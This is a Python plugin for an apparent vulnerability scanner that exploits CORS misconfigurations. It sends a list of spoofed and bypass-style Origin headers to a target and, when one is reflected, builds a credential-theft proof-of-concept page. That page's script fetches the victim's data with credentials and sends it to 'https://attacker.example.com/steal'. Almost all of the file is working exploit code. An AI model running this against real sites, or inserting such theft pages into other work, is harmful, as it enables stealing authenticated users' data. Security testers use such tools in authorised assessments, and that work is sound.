"""
CORS Misconfiguration Exploit Plugin

Provides exploit capabilities for CORS misconfiguration vulnerabilities:
- Credential theft PoC via CORS
- Origin reflection exploitation
- Null origin bypass
"""

import sys
import os
from typing import Dict, List, Any, Optional
from urllib.parse import urlparse
import logging

sys.path.insert(0, os.path.dirname(os.path.dirname(os.path.dirname(os.path.abspath(__file__)))))

from scanner.plugins.exploit_plugin import ExploitPlugin

try:
    import requests
    HAS_REQUESTS = True
except ImportError:
    HAS_REQUESTS = False

logger = logging.getLogger(__name__)

_PROBE_ORIGINS = [
    'https://attacker.example.com',
    'null',
    'https://evil.com',
    'https://target.attacker.example.com',
    'http://attacker.example.com',
    'https://attacker.example.com.evil.com',
    'https://notattacker.example.com',
    'https://www.attacker.example.com',
    'https://sub.attacker.example.com',
    'http://localhost',
    'http://127.0.0.1',
    'https://attacker.example.com%60.trusted.com',
    'https://trusted.com.attacker.example.com',
    'https://attacker.example.com/',
    'file://',
    'https://ATTACKER.EXAMPLE.COM',
    'https://attacker.example.com:80',
    'https://attacker.example.com:443',
    'http://attacker.example.com:8080',
    'https://xn--attacker-b94f.example.com',
    'https://attacker%2Eexample%2Ecom',
    'https://attacker.example.com%00.trusted.com',
]


def _cors_poc_html(target_url: str, attacker_origin: str) -> str:
    return f'''<!DOCTYPE html>
<html>
<head><title>CORS PoC</title></head>
<body>
<h2>CORS Credential Theft PoC</h2>
<p id="output">Fetching...</p>
<script>
fetch("{target_url}", {{credentials: "include"}})
  .then(r => r.text())
  .then(data => {{
    document.getElementById("output").innerText = "Stolen: " + data.substring(0, 200);
    fetch("https://attacker.example.com/steal?data=" + encodeURIComponent(data));
  }})
  .catch(e => document.getElementById("output").innerText = "Error: " + e);
</script>
</body>
</html>'''


class CORSPlugin(ExploitPlugin):
    """CORS Misconfiguration exploit plugin."""

    @property
    def vulnerability_type(self) -> str:
        return 'cors'

    @property
    def name(self) -> str:
        return 'CORS Misconfiguration Exploit'

    @property
    def description(self) -> str:
        return 'CORS exploit: credential theft PoC, origin reflection, null origin bypass.'

    @property
    def version(self) -> str:
        return '1.0.0'

    def generate_payloads(self, context: Optional[Dict[str, Any]] = None) -> List[str]:
        """Return probe Origin header values."""
        return list(_PROBE_ORIGINS)

    def execute_attack(self, target_url: str, vulnerability_data: Dict[str, Any],
                       config: Optional[Dict[str, Any]] = None) -> Dict[str, Any]:
        """Send cross-origin requests and inspect ACAO / ACAC headers."""
        if not HAS_REQUESTS:
            return {
                'success': False,
                'error': 'Requests library not available',
                'vulnerability_type': 'cors',
            }

        config = config or {}
        verify_ssl = config.get('verify_ssl', False)
        timeout = config.get('timeout', 10)

        for origin in _PROBE_ORIGINS:
            try:
                resp = requests.get(
                    target_url,
                    headers={'Origin': origin},
                    timeout=timeout,
                    verify=verify_ssl,
                )
                acao = resp.headers.get('Access-Control-Allow-Origin', '')
                acac = resp.headers.get('Access-Control-Allow-Credentials', '')

                if acao and (acao == origin or acao == '*'):
                    credentials_allowed = acac.lower() == 'true'
                    poc_html = _cors_poc_html(target_url, origin)
                    return {
                        'success': True,
                        'vulnerability_type': 'cors',
                        'origin_used': origin,
                        'acao_header': acao,
                        'acac_header': acac,
                        'credentials_allowed': credentials_allowed,
                        'poc_html': poc_html,
                        'evidence': (
                            f'CORS misconfiguration: Access-Control-Allow-Origin: {acao}'
                            + (', Access-Control-Allow-Credentials: true' if credentials_allowed else '')
                        ),
                        'message': 'CORS misconfiguration confirmed' + (
                            ' â€” credentials can be stolen' if credentials_allowed else ''
                        ),
                    }
            except Exception as e:
                logger.debug(f"CORS probe error (origin={origin}): {e}")

        return {
            'success': False,
            'error': 'No CORS misconfiguration confirmed',
            'vulnerability_type': 'cors',
        }
